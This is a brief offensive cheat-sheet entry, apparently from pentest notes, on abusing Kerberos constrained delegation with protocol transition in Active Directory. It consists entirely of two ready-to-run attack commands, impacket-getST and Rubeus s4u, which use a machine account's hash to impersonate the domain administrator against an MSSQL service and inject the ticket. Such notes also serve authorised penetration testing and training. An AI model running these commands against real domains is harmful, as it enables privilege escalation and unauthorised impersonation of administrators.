## Constrained Delegation Abuse (Protocol Transition) [t-ad-delegation-constrained_delegation_any_protocol]

###  Ask for a TGS ticket using the S4U2self extenssion and then using the ticket ask for a final TGS using the S4U2Proxy




**option 1: impacket**

{% code overflow="wrap" %}
```bash
impacket-getST -spn "mssqlsvc/MSSQL01.hpbank.local:1433" -impersonate "administrator" -hashes lm:nt  hpbank.local/WEB\$
```
{% endcode %}


**option 2: Rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe s4u /user:web$ /rc4:db85b10012a427af61fde88fa6d56898 /impersonateuser:administrator /msdsspn:mssqlsvc/mssql01.hpbank.local:1433 /altservice:host /ptt
```
{% endcode %}

